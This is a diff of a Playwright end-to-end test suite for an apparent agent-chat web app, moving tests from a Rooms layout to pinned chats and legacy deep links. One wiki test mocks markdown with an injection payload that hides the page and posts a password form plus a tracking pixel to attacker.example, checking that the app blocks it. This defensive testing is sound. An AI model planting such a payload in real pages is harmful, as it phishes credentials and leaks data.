@@ -3,85 +3,40 @@ import { test, expect } from '@playwright/test'
 const BASE = process.env.FEATHER_URL || 'http://localhost:4870'
 
 test.beforeEach(async ({ page }) => {
+  await page.route('**/api/**', route => {
+    const p = new URL(route.request().url()).pathname
+    const body = p === '/api/rooms' ? { rooms: [] } : p === '/api/chat-pins' ? { pins: [], archived: [] } : p === '/api/sessions' ? { sessions: [] } : p === '/api/sidecar' ? { groups: [] } : p === '/api/boxes' ? { boxes: [] } : p === '/api/sharing/peers' ? { peers: [] } : p === '/api/agents' ? { agents: [] } : p === '/api/quick-links' || p === '/api/starred' ? [] : { messages: [] }
+    return route.fulfill({ json: body })
+  })
   await page.route('**/api/feed', route => route.fulfill({
     json: { items: [], following: [], generatedAt: '2026-09-05T12:00:00Z' },
   }))
 })
 
-test('attaches and detaches an existing chat without duplicate Room rows', async ({ page }) => {
+test('finds an existing chat from the pinned home without duplicate rows', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
-  let attached = false
-  const seeded = {
-    id: 'seeded-room-chat', title: 'Seeded marriage chat', updatedAt: '2026-08-22T12:00:00Z',
-    isActive: false, agent: 'claude', roomAssigned: true,
-  }
-  const candidate = {
-    id: 'ungrouped-chat', title: 'Chat to attach', updatedAt: '2026-08-22T11:00:00Z',
-    isActive: false, agent: 'codex', projectId: '-srv-demo-unrelated',
-  }
-
-  await page.route('**/api/rooms', async (route) => {
-    await route.fulfill({ json: { rooms: [{
-      name: 'marriage', cwd: '/srv/demo/home/rooms/marriage', active: false,
-      latest: null, updatedAt: seeded.updatedAt,
-      pulse: { enabled: true, status: 'waiting', lastRunAt: null, nextRunAt: '2026-08-22T12:15:00Z', sessionId: null },
-      sessions: attached ? [seeded, { ...candidate, roomAssigned: true }] : [seeded],
-    }] } })
-  })
-  await page.route('**/api/sessions?limit=300', async (route) => {
-    await route.fulfill({ json: { sessions: [candidate] } })
-  })
-  await page.route('**/api/sessions?q=*', async (route) => {
-    await route.fulfill({ json: { sessions: [candidate] } })
-  })
-  await page.route('**/api/rooms/marriage/assign', async (route) => {
-    const body = JSON.parse(route.request().postData() || '{}')
-    if (body.sessionId === candidate.id) attached = !body.remove
-    await route.fulfill({ json: { ok: true, assignments: attached ? { [candidate.id]: 'marriage' } : {} } })
-  })
-  await page.route('**/api/rooms/marriage/pulse', async (route) => {
-    await route.fulfill({ json: { ok: true, pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null } } })
-  })
-
+  const chat = { id: 'marriage-chat', title: 'Marriage plans', updatedAt: '2026-08-22T12:00:00Z', isActive: false, agent: 'claude' }
+  await page.route('**/api/sessions?*', route => route.fulfill({ json: { sessions: [chat] } }))
+  await page.route('**/api/chat-pins', route => route.fulfill({ json: { pins: [{ id: chat.id, title: 'Marriage', legacy: true }], archived: [] } }))
   await page.goto(BASE)
-  await expect(page.getByText('#marriage')).toBeVisible()
-  await expect(page.getByTestId('pulse-marriage')).toHaveText('Status on')
-  await page.getByTestId('pulse-marriage').click()
-  await expect(page.getByTestId('pulse-marriage')).toHaveText('Status off')
-  await expect(page.getByText('Status off', { exact: true })).toHaveCount(1)
-  await page.locator('button:has-text("›")').click()
-  await page.getByTestId('attach-existing-marriage').click()
-  await expect(page.getByTestId('attach-picker-marriage')).toBeVisible()
-  await page.getByTestId(`attach-${candidate.id}`).click()
-
-  await expect(page.getByTestId(`detach-${candidate.id}`)).toHaveCount(0)
-  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
-  await page.getByTestId('manage-chats-marriage').click()
-  await expect(page.getByTestId(`detach-${candidate.id}`)).toBeVisible()
-  await page.screenshot({ path: 'test-results/rooms-u3-attach-mobile.png', fullPage: true })
-  await page.getByTestId(`detach-${candidate.id}`).click()
-  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(0)
-
-  await page.getByTestId('attach-search-marriage').fill('Chat to attach')
-  await page.getByTestId('attach-search-marriage').press('Enter')
-  await expect(page.getByTestId(`attach-${candidate.id}`)).toBeVisible()
-  await page.getByTestId(`attach-${candidate.id}`).click()
-  await expect(page.getByText(candidate.title, { exact: true })).toHaveCount(1)
+  await expect(page.getByRole('region', { name: 'Pinned chats', exact: true })).toContainText('Marriage')
+  await expect(page.getByRole('region', { name: 'Recent chats', exact: true })).not.toContainText('Marriage plans')
+  await page.getByRole('searchbox', { name: 'Search chats', exact: true }).fill('Marriage')
+  await expect(page.getByRole('button', { name: /Marriage plans/ }).first()).toBeVisible()
+  await page.getByRole('button', { name: /Marriage plans/ }).first().click()
+  await expect(page).toHaveURL(/#marriage-chat$/)
 })
 
-test('creates a named organizational chat inside a Room', async ({ page }) => {
+test('legacy chat deep links retain isolated fork lineage', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
   const createdId = '11111111-2222-4333-8444-555555555555'
   const forkedId = '66666666-7777-4888-8999-aaaaaaaaaaaa'
-  let assignedRoom = ''
-  let renamedTitle = ''
-  let created = false
   let forked = false
   let forkBody = null
-  const listedSessions = () => created ? [
+  const listedSessions = () => [
     { id: createdId, title: 'RL', updatedAt: new Date().toISOString(), isActive: true, agent: 'omp', roomAssigned: true },
     ...(forked ? [{ id: forkedId, title: 'RL inventory branch', updatedAt: new Date().toISOString(), isActive: true, agent: 'omp', roomAssigned: true }] : []),
-  ] : []
+  ]
   await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
     name: 'trading', cwd: '/home/user/rooms/trading', active: false,
     latest: null, updatedAt: null, leaderSessionId: null, residents: [], sessions: [],
@@ -89,13 +44,7 @@ test('creates a named organizational chat inside a Room', async ({ page }) => {
     friction: { count: 0, latestAt: null, latest: null },
     pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
   }] } }))
-  await page.route('**/api/sessions', async route => {
-    if (route.request().method() === 'POST') {
-      created = true
-      return route.fulfill({ json: { id: createdId } })
-    }
-    return route.fulfill({ json: { sessions: listedSessions() } })
-  })
+  await page.route('**/api/sessions', route => route.fulfill({ json: { sessions: listedSessions() } }))
   await page.route('**/api/sessions?*', route => route.fulfill({ json: { sessions: listedSessions() } }))
   await page.route(`**/api/sessions/${createdId}/room`, route => route.fulfill({
     json: { room: 'trading', kind: 'chat', role: null, label: 'RL' },
@@ -114,23 +63,8 @@ test('creates a named organizational chat inside a Room', async ({ page }) => {
       forkOf: createdId, forkSourceTitle: 'RL', workspaceMode: 'isolated', forkBranch: 'feather/fork-66666666',
     },
   }))
-  await page.route('**/api/rooms/trading/assign', async route => {
-    assignedRoom = JSON.parse(route.request().postData() || '{}').sessionId
-    await route.fulfill({ json: { ok: true, assignments: { [createdId]: 'trading' } } })
-  })
-  await page.route(`**/api/sessions/${createdId}/rename`, async route => {
-    renamedTitle = JSON.parse(route.request().postData() || '{}').title
-    await route.fulfill({ json: { ok: true } })
-  })
 
-  const answers = ['RL', 'omp']
-  page.on('dialog', dialog => dialog.accept(answers.shift() || ''))
-  await page.goto(BASE)
-  await page.getByTestId('room-card-trading').locator('button:has-text(\"›\")').click()
-  await page.getByRole('button', { name: '+ Named chat' }).click()
-  await expect(page).toHaveURL(new RegExp(`#${createdId}$`))
-  expect(assignedRoom).toBe(createdId)
-  expect(renamedTitle).toBe('RL')
+  await page.goto(`${BASE}/#${createdId}`)
   await expect(page.getByTestId('room-chat-breadcrumb')).toContainText('#trading / RL')
 
   await page.locator('button').filter({ hasText: '⋮' }).click()
@@ -145,69 +79,18 @@ test('creates a named organizational chat inside a Room', async ({ page }) => {
   await expect(page.getByTestId('fork-lineage')).toContainText('Forked from RL')
 })
 
-test('Room card always opens its durable Leader chat', async ({ page }) => {
+test('a migrated pin opens the durable Leader rather than a newer worker', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
-  const pulse = {
-    id: 'pulse-chat', title: 'Status: #feather', updatedAt: '2026-08-24T01:00:00Z',
-    isActive: true, agent: 'omp', roomAssigned: true,
-  }
-  const leader = {
-    id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z',
-    isActive: false, agent: 'omp', roomAssigned: true,
-  }
-  const operator = {
-    id: 'operator-chat', title: 'Feather Operator', updatedAt: '2026-08-23T23:30:00Z',
-    isActive: false, agent: 'omp', roomAssigned: true,
-  }
-  const newer = {
-    id: 'newer-human-chat', title: 'A newer human chat', updatedAt: '2026-08-24T00:30:00Z',
-    isActive: false, agent: 'claude', roomAssigned: true,
-  }
-  const archived = Array.from({ length: 5 }, (_, index) => ({
-    id: `archived-${index}`, title: `Archived chat ${index}`, updatedAt: `2026-08-22T0${index}:00:00Z`,
-    isActive: false, agent: 'codex', roomAssigned: true,
-  }))
-  const leaderSessionId = leader.id
-  const pulseSessionId = pulse.id
-  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
-    name: 'feather', cwd: '/home/user/rooms/feather', active: true,
-    latest: { role: 'assistant', text: 'Leader finished work.' }, updatedAt: leader.updatedAt,
-    updates: { count: 0, latestAt: null, latest: null },
-    friction: { count: 0, latestAt: null, latest: null },
-    pulse: { enabled: true, status: pulseSessionId ? 'working' : 'waiting', lastRunAt: pulse.updatedAt, nextRunAt: null, sessionId: pulseSessionId },
-    leaderSessionId,
-    residents: [
-      { role: 'leader', sessionId: leader.id, agent: 'omp', title: leader.title, status: 'waiting' },
-      { role: 'operator', sessionId: operator.id, agent: 'omp', title: operator.title, status: 'waiting' },
-    ],
-    sessions: [pulse, newer, leader, operator, ...archived],
-  }] } }))
-
+  const leader = { id: 'leader-human-chat', title: '#feather Leader', updatedAt: '2026-08-23T23:00:00Z', isActive: false, agent: 'omp' }
+  const pulse = { id: 'pulse-chat', title: 'Status: #feather', updatedAt: '2026-08-24T01:00:00Z', isActive: true, agent: 'omp' }
+  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{ name: 'feather', leaderSessionId: leader.id, sessions: [pulse, leader] }] } }))
+  await page.route('**/api/chat-pins', route => route.fulfill({ json: { pins: [{ id: leader.id, title: 'Feather', legacy: true }], archived: [] } }))
   await page.goto(BASE)
-  await expect(page.getByText('#feather', { exact: true })).toBeVisible()
-  await page.getByTestId('room-card-feather').locator('button:has-text("›")').click()
-  await expect(page.getByTestId('resident-feather-leader')).toBeVisible()
-  await expect(page.getByText('Main', { exact: true }).first()).toBeVisible()
-  await expect(page.getByText('People', { exact: true })).toBeVisible()
-  await expect(page.getByText('Chats', { exact: true })).toBeVisible()
-  await expect(page.getByText('Status', { exact: true }).first()).toBeVisible()
-  await page.getByTestId('resident-feather-operator').click()
-  await expect(page).toHaveURL(/#operator-chat$/)
-  await page.goto(BASE)
-  await page.getByTestId('room-card-feather').locator('button:has-text(\"›\")').click()
-  await expect(page.getByTestId(`session-${archived.at(-1).id}`)).toHaveCount(0)
-  await page.getByText('#feather', { exact: true }).click()
+  const pinned = page.getByRole('region', { name: 'Pinned chats', exact: true })
+  await expect(pinned).toContainText('Feather')
+  await expect(pinned).not.toContainText('Status:')
+  await pinned.getByRole('button', { name: /^Feather/ }).click()
   await expect(page).toHaveURL(/#leader-human-chat$/)
-
-  await page.goto(BASE)
-  await page.getByTestId('room-card-feather').locator('button:has-text("›")').click()
-  await page.getByTestId('manage-chats-feather').click()
-  await expect(page.getByTestId(`session-${archived.at(-1).id}`)).toBeVisible()
-  await expect(page.getByTestId('resident-feather-leader')).toBeVisible()
-  await expect(page.getByTestId(`detach-${leader.id}`)).toHaveCount(0)
-  await expect(page.getByTestId(`detach-${operator.id}`)).toHaveCount(0)
-  await expect(page.getByTestId(`detach-${pulse.id}`)).toHaveCount(0)
-  await expect(page.getByTestId('room-card-feather')).toContainText('2 residents')
 })
 
 test('Wiki presents caretaker synthesis and never exposes the raw Updates feed', async ({ page }) => {
@@ -227,10 +110,10 @@ test('Wiki presents caretaker synthesis and never exposes the raw Updates feed',
       sessions: [],
     }] } })
   })
-  await page.route('**/api/rooms/meta/wiki', async (route) => {
-    await route.fulfill({ json: { pages: [{ name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }] } })
+  await page.route('**/api/wiki', async (route) => {
+    await route.fulfill({ json: { pages: [{ source: 'room:meta', name: 'Home', size: 80, updatedAt: '2026-08-22T14:00:00Z' }] } })
   })
-  await page.route('**/api/rooms/meta/wiki/page**', async (route) => {
+  await page.route('**/api/wiki/page**', async (route) => {
     await route.fulfill({ json: {
       name: 'Home',
       content: '# Meta knowledge\n\nThe caretaker synthesized the evidence into this durable conclusion.\n\n<style>body{display:none}</style><form action=\"https://attacker.example/steal\"><input name=\"password\"></form>![pixel](https://attacker.example/pixel)',
@@ -242,12 +125,8 @@ test('Wiki presents caretaker synthesis and never exposes the raw Updates feed',
     await route.fulfill({ json: { updates: [{ id: 'u1', ts: null, text: 'RAW COPIED TWEET' }] } })
   })
 
-  await page.goto(BASE)
-  const wiki = page.getByTestId('wiki-meta')
-  await expect(wiki).toBeVisible()
-  await expect(wiki).not.toContainText('new')
-  await wiki.click()
-  const panel = page.getByTestId('wiki-panel-meta')
+  await page.goto(`${BASE}/#wiki`)
+  const panel = page.locator('article.wiki-markdown')
   await expect(panel).toContainText('The caretaker synthesized the evidence')
   await expect(panel).not.toContainText('RAW COPIED TWEET')
   await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
@@ -256,37 +135,19 @@ test('Wiki presents caretaker synthesis and never exposes the raw Updates feed',
   expect(remoteMediaRequests).toBe(0)
 })
 
-test('shows friction only on the Room that reported it', async ({ page }) => {
-  await page.setViewportSize({ width: 390, height: 844 })
-  const complaints = [{
-    id: 'f1', timestamp: '2026-08-23T12:00:00Z', source: 'health',
-    summary: 'Calendar login loop', evidence: 'OAuth callback returned 401',
-  }]
-  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [{
-    name: 'health', cwd: '/srv/rooms/health', active: false, latest: null,
-    updatedAt: complaints[0].timestamp,
-    updates: { count: 0, latestAt: null, latest: null },
-    friction: { count: 1, latestAt: complaints[0].timestamp, latest: complaints[0].summary },
-    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
-    sessions: [],
-  }, {
-    name: 'family', cwd: '/srv/rooms/family', active: false, latest: null, updatedAt: null,
-    updates: { count: 0, latestAt: null, latest: null },
-    friction: { count: 0, latestAt: null, latest: null },
-    pulse: { enabled: false, status: 'paused', lastRunAt: null, nextRunAt: null, sessionId: null },
-    sessions: [],
-  }] } }))
-  await page.route('**/api/rooms/health/friction', route => route.fulfill({ json: { complaints, count: 1 } }))
-
-  await page.goto(BASE)
-  await expect(page.getByTestId('friction-health')).toContainText('1')
-  await expect(page.getByTestId('friction-family')).toContainText('0')
-  await page.getByTestId('friction-health').click()
-  const panel = page.getByTestId('friction-panel-health')
-  await expect(panel).toBeVisible()
-  await expect(panel).toContainText('Calendar login loop')
-  await expect(panel).toContainText('OAuth callback returned 401')
-  await expect(page.getByTestId('friction-panel-family')).toHaveCount(0)
+test('legacy Room deep links scope friction to its source', async ({ page }) => {
+  const rooms = ['health', 'family'].map(name => ({ name, cwd: '/srv/rooms/' + name, sessions: [], residents: [], friction: { count: name === 'health' ? 1 : 0 }, pulse: { enabled: false } }))
+  await page.route('**/api/rooms', route => route.fulfill({ json: { rooms } }))
+  await page.route('**/api/rooms/*/wiki', route => route.fulfill({ json: { pages: [] } }))
+  await page.route('**/api/rooms/health/friction', route => route.fulfill({ json: { complaints: [{ id: 'f1', source: 'health', summary: 'Calendar login loop', evidence: 'OAuth callback returned 401' }], count: 1 } }))
+  await page.route('**/api/rooms/family/friction', route => route.fulfill({ json: { complaints: [], count: 0 } }))
+  await page.goto(`${BASE}/#room/health`)
+  await expect(page.getByTestId('room-friction')).toContainText('Calendar login loop')
+  await expect(page.getByTestId('room-friction')).not.toContainText('OAuth callback returned 401')
+  await page.goto(`${BASE}/#room/family`)
+  await page.reload() // Exercise a separately opened saved deep link.
+  await expect(page.getByTestId('room-page-family')).toBeVisible()
+  await expect(page.getByTestId('room-friction')).not.toContainText('Calendar login loop')
 })
 
 test('Super Feed filters attention, subscriptions, and friction without exposing raw evidence', async ({ page }) => {
@@ -341,7 +202,7 @@ test('Super Feed filters attention, subscriptions, and friction without exposing
 
   await page.route('**/api/rooms', route => route.fulfill({ json: { rooms: [room] } }))
 
-  await page.goto(BASE)
+  await page.goto(`${BASE}/#updates`)
   await expect(page.getByRole('heading', { name: 'Super Feed' })).toBeVisible()
   const feed = page.getByTestId('super-feed')
   await expect(feed.getByText('Risk review completed.', { exact: true })).not.toBeVisible()
@@ -400,7 +261,7 @@ test('Costs tab shows provider limits and the token ledger, and lives at #costs'
   await page.route('**/api/feed', route => route.fulfill({ json: { items: [], following: [], cursor: 'c', generatedAt: new Date().toISOString() } }))
 
   await page.goto(BASE)
-  await expect(page.getByTestId('home-nav-rooms')).toBeVisible()
+  await expect(page.getByTestId('home-nav-chats')).toBeVisible()
   await expect(page.getByTestId('costs-view')).toHaveCount(0)
   await page.getByTestId('home-nav-costs').click()
   await expect(page.getByTestId('costs-view')).toBeVisible()
@@ -423,12 +284,12 @@ test('Costs tab shows provider limits and the token ledger, and lives at #costs'
   await expect.poll(() => usageRequests).toBeGreaterThan(before)
   await page.reload()
   await expect(page.getByTestId('costs-view')).toBeVisible()
-  await page.getByTestId('home-nav-rooms').click()
+  await page.getByTestId('home-nav-chats').click()
   await expect(page.getByTestId('costs-view')).toHaveCount(0)
   await expect.poll(() => page.evaluate(() => location.hash)).toBe('')
 })
 
-test('Room page shows the mission, residents, cards, and friction, and is reachable from the feed and the room card', async ({ page }) => {
+test('Updates open Wiki collections while legacy Room deep links retain mission and controls', async ({ page }) => {
   await page.setViewportSize({ width: 390, height: 844 })
   await page.unroute('**/api/feed')
   let paused = false
@@ -489,18 +350,18 @@ test('Room page shows the mission, residents, cards, and friction, and is reacha
   await page.route('**/api/rooms/ev-shop/pulse', route => route.fulfill({ json: { enabled: !paused, status: 'waiting', lastRunAt: null, nextRunAt: null, sessionId: null } }))
   await page.route('**/api/sessions/ev-leader/**', route => route.fulfill({ json: { messages: [] } }))
 
-  await page.goto(BASE)
+  await page.goto(`${BASE}/#updates`)
   // The feed marks a resolved complaint and keeps the open one plain.
   const resolvedCard = page.getByTestId('feed-item-friction:slow-wiki')
   await expect(resolvedCard).toContainText('Resolved')
   await expect(page.getByTestId('resolved-slow-wiki')).toContainText('Cached the wiki index')
   await expect(page.getByTestId('feed-item-friction:permit-portal')).not.toContainText('Resolved')
-  // The room card counts only open friction.
-  await expect(page.getByTestId('friction-ev-shop')).toContainText('1')
-
-  // The Room chip on any card goes to the Room page, not the chat.
+  await page.route('**/api/wiki', route => route.fulfill({ json: { pages: [{ source: 'room:ev-shop', name: 'Home', size: 80 }] } }))
+  await page.route('**/api/wiki/page**', route => route.fulfill({ json: { content: '# EV shop wiki\n\nThe cheapest installer so far is Volt Bros.' } }))
+  // The collection chip opens the Wiki; saved Room deep links remain compatible.
   await page.getByTestId('feed-item-publication:ev-shop:kickoff-plan').getByTestId('open-room-ev-shop').click()
-  await expect(page).toHaveURL(/#room\/ev-shop$/)
+  await expect(page.locator('article.wiki-markdown')).toContainText('Volt Bros')
+  await page.goto(`${BASE}/#room/ev-shop`)
   const roomPage = page.getByTestId('room-page-ev-shop')
   await expect(roomPage).toBeVisible()
   await expect(page.getByTestId('room-mission')).toContainText('cheapest way to get an EV charger')
@@ -519,16 +380,13 @@ test('Room page shows the mission, residents, cards, and friction, and is reacha
   await expect(page.getByTestId('room-resident-caretaker')).toContainText('paused')
   expect(pauseCalls).toEqual([true])
 
-  // Reload keeps the Room page; back returns to Rooms.
+  // Reload retains the old deep link; Back returns to the new chat home.
   await page.reload()
   await expect(page.getByTestId('room-page-ev-shop')).toBeVisible()
   await page.getByTestId('room-page-back').click()
-  await expect(page).toHaveURL(new RegExp(`${BASE.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&')}/?#?$`))
-  await expect(page.getByTestId('room-card-ev-shop')).toBeVisible()
-
-  // The Room button on the card opens the page; tapping the card still opens the Leader.
-  await page.getByTestId('room-page-ev-shop').click()
-  await expect(page.getByTestId('room-page-ev-shop')).toBeVisible()
+  await expect(page.getByTestId('chats-home')).toBeVisible()
+  await expect(page.getByRole('heading', { name: 'Chats', exact: true })).toBeVisible()
+  await page.goto(`${BASE}/#room/ev-shop`)
   await page.getByTestId('room-open-leader').click()
   await expect(page).toHaveURL(/#ev-leader$/)
 })
